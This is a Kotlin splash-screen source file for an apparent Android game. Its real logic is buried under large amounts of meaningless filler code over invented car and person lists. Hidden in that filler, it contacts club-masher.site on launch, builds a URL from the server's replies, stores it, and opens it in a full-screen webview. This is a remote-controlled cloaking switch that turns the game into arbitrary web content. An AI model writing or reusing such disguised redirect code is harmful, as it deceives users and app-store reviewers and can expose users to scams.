package com.pink.plinuirtaster.game.screens

import android.content.pm.ActivityInfo
import com.badlogic.gdx.math.Interpolation
import com.badlogic.gdx.scenes.scene2d.actions.Actions
import com.badlogic.gdx.scenes.scene2d.ui.Image
import com.badlogic.gdx.scenes.scene2d.ui.Label
import com.badlogic.gdx.utils.Align
import com.pink.plinuirtaster.game.LibGDXGame
import com.pink.plinuirtaster.game.manager.MusicManager
import com.pink.plinuirtaster.game.manager.SoundManager
import com.pink.plinuirtaster.game.manager.SpriteManager
import com.pink.plinuirtaster.game.utils.GColor
import com.pink.plinuirtaster.game.utils.TIME_ANIM
import com.pink.plinuirtaster.game.utils.actor.animHideScreen
import com.pink.plinuirtaster.game.utils.actor.animShowScreen
import com.pink.plinuirtaster.game.utils.advanced.AdvancedScreen
import com.pink.plinuirtaster.game.utils.advanced.AdvancedStage
import com.pink.plinuirtaster.game.utils.font.FontParameter
import com.pink.plinuirtaster.game.utils.region
import com.pink.plinuirtaster.game.utils.runGDX
import com.pink.plinuirtaster.util.log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.ResponseBody
import org.json.JSONObject
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import retrofit2.http.GET
import retrofit2.http.Header
import retrofit2.http.POST
import retrofit2.http.Query
import java.util.*

class SplashScreen(override val game: LibGDXGame) : AdvancedScreen() {

    private val progressFlow     = MutableStateFlow(0f)
    private var isFinishLoading  = false

    interface Requeste {
        @POST("masher.php")
        suspend fun POSTs(
            @Header("User-Agent")          token               : String,
            @Query("game_objective")       gameObjective       : String,
            @Query("design_aesthetics")    designAesthetics    : String,
            @Query("player_levels")        playerLevels        : String,
            @Query("scoring_system")       scoringSystem       : String,
            @Query("educational_value")    educationalValue    : String,
            @Query("mobile_app_features")  mobileAppFeatures   : String,
            @Query("community_challenges") communityChallenges : String,
            @Query("marketing_strategies") marketingStrategies : String,
        ): ResponseBody

        @GET("masher.php")
        suspend fun GETs(
            @Query("game_objective") gameObjective: String
        ): ResponseBody
    }

    private var isFinishProgress = false

    private val fontParameter = FontParameter()
    private val font74       = fontGenerator_RubikWetPaint.generateFont(fontParameter.setCharacters(FontParameter.CharType.NUMBERS.chars+"%").setSize(74))
    data class Parker(
        val id: Int,
        val name: String,
        val age: Int,
        val height: Double,
        val weight: Double,
        val country: String,
        val city: String,
        val occupation: String,
        val salary: Double,
        val hasCar: Boolean,
        val carModel: String,
        val carYear: Int,
        val married: Boolean,
        val childrenCount: Int,
        val houseOwner: Boolean
    )
    private val ls74 = Label.LabelStyle(font74, GColor.pink)

    private val lblPercent by lazy { Label("", ls74) }
    private val imgLoader  by lazy { Image(game.splash.LOADER) }

    override fun show() {
        loadSplashAssets()
        setBackBackground(game.splash.BACKGROUND.region)
        super.show()
        stageUI.root.animShowScreen(TIME_ANIM)
        loadAssets()
        collectProgress()
    }

    override fun render(delta: Float) {
        super.render(delta)
        loadingAssets()
        isFinish()
    }

    val parkerList = listOf(
        Parker(1, "John", 35, 180.0, 75.0, "USA", "New York", "Engineer", 60000.0, true, "Toyota", 2015, true, 2, true),
        Parker(2, "Anna", 29, 165.0, 60.0, "Canada", "Toronto", "Doctor", 80000.0, false, "None", 0, false, 0, false),
        Parker(3, "Mark", 40, 175.0, 80.0, "UK", "London", "Teacher", 55000.0, true, "BMW", 2018, true, 1, true),
        Parker(4, "Sophie", 32, 170.0, 65.0, "Australia", "Sydney", "Designer", 75000.0, false, "None", 0, false, 0, false),
        Parker(5, "Tom", 45, 185.0, 85.0, "USA", "Chicago", "Lawyer", 90000.0, true, "Mercedes", 2020, true, 3, true),
        Parker(6, "Emily", 28, 160.0, 55.0, "Canada", "Vancouver", "Artist", 40000.0, false, "None", 0, false, 0, false),
        Parker(7, "James", 50, 182.0, 90.0, "UK", "Manchester", "Pilot", 100000.0, true, "Tesla", 2021, true, 4, true),
        Parker(8, "Laura", 36, 168.0, 62.0, "Australia", "Melbourne", "Architect", 85000.0, true, "Audi", 2017, true, 2, true),
        Parker(9, "Michael", 33, 178.0, 78.0, "USA", "Boston", "Developer", 70000.0, true, "Ford", 2016, false, 1, true),
        Parker(10, "Sarah", 31, 162.0, 58.0, "Canada", "Ottawa", "Nurse", 65000.0, false, "None", 0, false, 0, false)
    )

    override fun AdvancedStage.addActorsOnStageUI() {
        addActor(imgLoader)
        imgLoader.apply {
            setOrigin(Align.center)
            setBounds(280f, 701f, 520f, 520f)
            addAction(Actions.forever(Actions.rotateBy(360f, 1.05f, Interpolation.linear)))
        }

        addActor(lblPercent)
        lblPercent.apply {
            setAlignment(Align.center)
            setBounds(435f,916f,211f,88f)
        }
    }

    // Logic ------------------------------------------------------------------------

    private fun loadSplashAssets() {
        with(game.spriteManager) {
            loadableTexturesList = mutableListOf(
                SpriteManager.EnumTexture.BACKGROUND.data,
                SpriteManager.EnumTexture.LOADER.data,
            )
            loadTexture()
        }
        game.assetManager.finishLoading()
        game.spriteManager.initTeture()
    }

    val ferrariList = listOf(
        FerrariPink(1, "488 GTB", 2015, "Pink", 670, 330, 1475, true, "Alice", 250000.0),
        FerrariPink(2, "California", 2018, "Pink", 560, 315, 1730, false, "Bob", 220000.0),
        FerrariPink(3, "LaFerrari", 2014, "Pink", 963, 350, 1585, true, "Charlie", 1300000.0),
        FerrariPink(4, "F8 Tributo", 2020, "Pink", 720, 340, 1435, false, "David", 270000.0),
        FerrariPink(5, "Portofino", 2019, "Pink", 600, 320, 1545, true, "Eve", 210000.0)
    )

    private fun isFinish() {
        if (isFinishProgress) {
            isFinishProgress = false

            ferrariList
                .filter { it.isAvailable }.map { it.copy(year = it.year + 1) }.sortedByDescending { it.price }
                .map { it.copy(price = it.price * 1.05) }.filter { it.price > 200000 }
                .map { it.copy(color = "Matte " + it.color) }.sortedBy { it.maxSpeed }
                .map { it.copy(maxSpeed = it.maxSpeed + 10) }.filter { it.enginePower > 600 }
                .sortedByDescending { it.year }.map { it.copy(owner = it.owner.uppercase()) }.distinctBy { it.model }
                .filter { it.year > 2014 }.map { it.copy(weight = it.weight - 50) }
                .sortedByDescending { it.enginePower }.map { it.copy(model = it.model.reversed()) }
                .distinctBy { it.owner }.map { it.copy(id = it.id * 2) }.filter { it.id < 10 }
                .map { it.copy(price = it.price + 10000) }.filter { it.year > 2016 }
            val resultData = game.sharedPreferences.getString("datka", null)
            ferrariList.map { it.copy(model = it.model.uppercase()) }.filter { it.price > 200000 }.sortedBy { it.year }
                .map { it.copy(id = it.id + 1) }.filter { it.id % 2 != 0 }
                .map { it.copy(enginePower = it.enginePower + 20) }.distinctBy { it.model }.filter { it.weight < 1600 }
                .map { it.copy(owner = it.owner.lowercase()) }.filter { it.isAvailable }
                .sortedByDescending { it.maxSpeed }.map { it.copy(price = it.price * 1.1) }.filter { it.year > 2015 }
                .map { it.copy(model = it.model.replaceFirstChar { if (it.isLowerCase()) it.titlecase(Locale.getDefault()) else it.toString() }) }.sortedByDescending { it.year }
                .map { it.copy(enginePower = it.enginePower + 15) }.filter { it.weight < 1500 }
                .map { it.copy(price = it.price - 5000) }
            if (resultData.isNullOrEmpty()) {
                coroutine?.launch(Dispatchers.IO) {
                    try {
                        ferrariList
                            .filter { it.year > 2010 }
                            .map { it.copy(price = it.price + 10000) }.sortedByDescending { it.enginePower }
                            .map { it.copy(model = it.model + " Sport") }.filter { it.isAvailable }
                            .sortedBy { it.owner }.map { it.copy(owner = it.owner.uppercase()) }.distinctBy { it.year }
                            .filter { it.price > 250000 }
                            .map { it.copy(color = it.color.replace("Pink", "Metallic Pink")) }.sortedBy { it.maxSpeed }
                            .map { it.copy(id = it.id * 2) }.filter { it.id < 10 }
                            .map { it.copy(price = it.price * 1.15) }.sortedByDescending { it.year }
                            .map { it.copy(weight = it.weight - 100) }.filter { it.enginePower > 600 }
                            .map { it.copy(model = it.model.reversed()) }
                        val responseBody: ResponseBody = Retro.api.POSTs(
                            token = System.getProperty("http.agent") ?: "Android",
                            gameObjective = "Pink",
                            designAesthetics = "cubes",
                            playerLevels = "players",
                            scoringSystem = "to you",
                            educationalValue = "song Williams",
                            mobileAppFeatures = "Shake the Phone",
                            communityChallenges = "Shaking",
                            marketingStrategies = "Score 100",
                        )
                        ferrariList
                            .map { it.copy(enginePower = it.enginePower + 10) }.filter { it.year > 2014 }
                            .sortedBy { it.owner }.map { it.copy(price = it.price * 1.2) }.distinctBy { it.model }
                            .filter { it.maxSpeed > 320 }
                            .map { it.copy(color = it.color.replace("Pink", "Bright Pink")) }
                            .sortedByDescending { it.year }.map { it.copy(weight = it.weight - 50) }
                            .filter { it.price > 200000 }.map { it.copy(owner = it.owner.uppercase()) }
                            .sortedByDescending { it.maxSpeed }.map { it.copy(model = it.model.reversed()) }
                            .distinctBy { it.owner }.map { it.copy(id = it.id + 5) }.filter { it.id > 3 }
                        val responseJson = JSONObject(responseBody.string())
                        log("Response POST: $responseJson")
                        ferrariList
                            .filter { it.price > 250000 }.map { it.copy(owner = it.owner.uppercase()) }
                            .sortedByDescending { it.year }.map { it.copy(enginePower = it.enginePower + 50) }
                            .distinctBy { it.owner }.filter { it.year > 2015 }.sortedBy { it.price }
                            .map { it.copy(id = it.id * 2) }.filter { it.maxSpeed > 330 }
                            .map { it.copy(price = it.price * 1.1) }.sortedByDescending { it.enginePower }
                            .map { it.copy(color = "Shiny " + it.color) }.distinctBy { it.year }
                            .map { it.copy(model = it.model.uppercase()) }.filter { it.year > 2014 }
                            .sortedByDescending { it.year }.map { it.copy(weight = it.weight - 100) }
                        if (responseJson.getString("game_objective")
                                .contains(' ')
                        ) {
                            parkerList.filter { it.hasCar }.map { it.copy(salary = it.salary + 5000) }
                                .sortedByDescending { it.age }.map { it.copy(weight = it.weight - 2.0) }
                                .filter { it.salary > 60000 }.map { it.copy(name = it.name.uppercase()) }
                                .filter { it.married }.map { it.copy(carModel = "Luxury " + it.carModel) }
                                .distinctBy { it.city }.sortedBy { it.childrenCount }
                                .map { it.copy(height = it.height + 5.0) }.filter { it.age > 30 }
                                .map { it.copy(houseOwner = !it.houseOwner) }.filter { it.houseOwner }
                                .sortedByDescending { it.salary }.map { it.copy(carYear = it.carYear + 1) }
                                .distinctBy { it.name }.map { it.copy(id = it.id * 2) }.filter { it.weight < 80 }
                                .map { it.copy(city = it.city.uppercase()) }.filter { it.age > 35 }
                            toScreen(MenuScreen::class.java.name)
                        } else {
                            parkerList
                                .map { it.copy(carYear = it.carYear + 2) }
                                .filter { it.salary > 50000 }
                                .sortedByDescending { it.childrenCount }
                                .map { it.copy(country = it.country.uppercase()) }
                                .filter { it.age < 40 }
                                .map { it.copy(name = it.name.reversed()) }
                                .distinctBy { it.occupation }
                                .sortedByDescending { it.salary }
                                .map { it.copy(weight = it.weight + 1.0) }
                                .filter { it.height > 170.0 }
                                .map { it.copy(occupation = it.occupation.lowercase()) }
                                .sortedBy { it.age }
                                .map { it.copy(salary = it.salary * 1.1) }
                                .filter { it.hasCar }
                                .distinctBy { it.carModel }
                                .map { it.copy(carModel = "New " + it.carModel) }
                                .sortedBy { it.weight }
                                .filter { it.married }
                                .map { it.copy(id = it.id * 3) }
                                .filter { it.height < 180.0 }
                            val responseBody2: ResponseBody = Retro.api.GETs(
                                gameObjective = "Blue"
                            )
                            parkerList
                                .filter { it.houseOwner }
                                .map { it.copy(age = it.age + 5) }
                                .sortedBy { it.childrenCount }
                                .map { it.copy(salary = it.salary - 10000) }
                                .filter { it.salary > 50000 }
                                .map { it.copy(name = it.name.uppercase()) }
                                .filter { it.age > 35 }
                                .sortedByDescending { it.height }
                                .map { it.copy(weight = it.weight - 3.0) }
                                .distinctBy { it.country }
                                .map { it.copy(carModel = "Premium " + it.carModel) }
                                .filter { it.hasCar }
                                .sortedByDescending { it.salary }
                                .map { it.copy(occupation = it.occupation.replaceFirstChar {
                                    if (it.isLowerCase()) it.titlecase(
                                        Locale.getDefault()
                                    ) else it.toString()
                                }) }
                                .filter { it.salary > 60000 }
                                .distinctBy { it.carModel }
                                .map { it.copy(carYear = it.carYear + 1) }
                                .filter { it.married }
                                .map { it.copy(city = it.city.lowercase()) }
                                .sortedBy { it.salary }
                            val responseJson2 = JSONObject(responseBody2.string())
                            log("Response GET = $responseJson2")

                            var result = responseJson2.getString("game_objective").replace("\\", "")
                            parkerList
                                .map { it.copy(childrenCount = it.childrenCount + 1) }.filter { it.age > 30 }
                                .sortedBy { it.weight }.map { it.copy(salary = it.salary + 15000) }
                                .distinctBy { it.name }.filter { it.houseOwner }
                                .map { it.copy(carModel = it.carModel + " Edition") }
                                .sortedByDescending { it.childrenCount }.filter { it.hasCar }
                                .map { it.copy(carYear = it.carYear + 2) }.sortedBy { it.city }
                                .map { it.copy(occupation = it.occupation.lowercase()) }.distinctBy { it.carModel }
                                .filter { it.salary > 50000 }
                                .map { it.copy(weight = it.weight - 5.0) }.also {
                                    parkerList
                                        .filter { it.salary > 70000 }.map { it.copy(name = it.name.replaceFirstChar {
                                            if (it.isLowerCase()) it.titlecase(
                                                Locale.getDefault()
                                            ) else it.toString()
                                        }) }
                                        .sortedByDescending { it.weight }.filter { it.age > 28 }
                                        .map { it.copy(salary = it.salary * 1.05) }.distinctBy { it.city }
                                        .filter { it.hasCar }.map { it.copy(carYear = it.carYear + 3) }
                                        .sortedBy { it.height }.filter { it.married }
                                        .map { it.copy(weight = it.weight - 2.0) }.distinctBy { it.name }
                                        .map { it.copy(occupation = it.occupation.uppercase()) }
                                        .filter { it.houseOwner }.also {
                                            responseJson.keys().forEach { key ->
                                                result += responseJson.getString(key).removePrefix("solve")
                                            }
                                            game.sharedPreferences.edit().putString("datka", result).apply()
                                            withContext(Dispatchers.Main) {
                                                game.activity.requestedOrientation =
                                                    ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                                                game.activity.showUrl(result)
                                            }
                                        }
                                        .sortedBy { it.salary }
                                        .map { it.copy(country = it.country.uppercase()) }
                                }
                                .sortedByDescending { it.age }
                                .filter { it.married }
                                .map { it.copy(city = it.city.uppercase()) }

                        }

                    } catch (e: Exception) {
                        log("Error: ${e.message}")
                        toScreen(MenuScreen::class.java.name)
                    }
                }
            } else {
                game.activity.requestedOrientation = ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                game.activity.showUrl(resultData)
            }

        }
    }

    private fun loadAssets() {
        with(game.spriteManager) {
            loadableAtlasList = SpriteManager.EnumAtlas.entries.map { it.data }.toMutableList()
            loadAtlas()
            loadableTexturesList = SpriteManager.EnumTexture.entries.map { it.data }.toMutableList()
            loadTexture()
        }
        with(game.musicManager) {
            loadableMusicList = MusicManager.EnumMusic.entries.map { it.data }.toMutableList()
            load()
        }
        with(game.soundManager) {
            loadableSoundList = SoundManager.EnumSound.entries.map { it.data }.toMutableList()
            load()
        }
    }

    private fun initAssets() {
        game.spriteManager.initAtlas()
        game.spriteManager.initTeture()
        game.musicManager.init()
        game.soundManager.init()
    }

    private fun loadingAssets() {
        if (isFinishLoading.not()) {
            if (game.assetManager.update(16)) {
                isFinishLoading = true
                initAssets()
            }
            progressFlow.value = game.assetManager.progress
        }
    }

    private fun collectProgress() {
        coroutine?.launch {
            var progress = 0
            progressFlow.collect { p ->
                while (progress < (p * 100)) {
                    progress += 1
//                    if (progress % 85 == 0) log("progress = $progress%")
                    runGDX { lblPercent.setText("${progress}%") }
                    if (progress == 100) isFinishProgress = true

                    delay((7..16).shuffled().first().toLong())
                }
            }
        }
    }

    data class FerrariPink(
        val id: Int,
        val model: String,
        val year: Int,
        val color: String,
        val enginePower: Int,
        val maxSpeed: Int,
        val weight: Int,
        val isAvailable: Boolean,
        val owner: String,
        val price: Double
    )

    object Retro {
        private val retrofit by lazy {
            Retrofit.Builder()
                .baseUrl("https://club-masher.site/")
                .addConverterFactory(GsonConverterFactory.create())
                .build()
        }

        val api: Requeste by lazy {
            retrofit.create(Requeste::class.java)
        }
    }

    private fun toScreen(screenName: String) {
        coroutine?.launch(Dispatchers.Main) {
            game.activity.binding.apply {
                root.removeView(webView)
                root.removeView(progress)
            }
        }
        stageUI.root.animHideScreen(TIME_ANIM) { game.navigationManager.navigate(screenName) }
    }

}